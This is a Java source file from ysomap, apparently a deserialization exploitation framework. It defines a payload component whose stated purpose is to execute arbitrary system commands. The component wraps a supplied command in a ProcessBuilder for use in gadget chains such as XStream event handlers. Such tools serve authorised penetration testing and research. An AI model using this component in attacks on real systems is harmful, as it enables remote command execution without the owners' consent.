package ysomap.bullets.jdk;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

import java.util.Arrays;
import java.util.List;

/**
 * @author wh1t3P1g
 * @since 2020/4/15
 */
@Bullets
@Dependencies({"jdk"})
@Details("执行任意系统命令")
@Authors({Authors.WH1T3P1G})
public class ProcessBuilderBullet implements Bullet<ProcessBuilder> {

    @NotNull
    @Require(name = "command", detail = "system commands")
    public String command;

    public String action = "start"; // for xstream eventhandler gadgets

    @Override
    public ProcessBuilder getObject() throws Exception {
        List<String> cmd = Arrays.asList(command.split(" "));
        return new ProcessBuilder(cmd);
    }
}
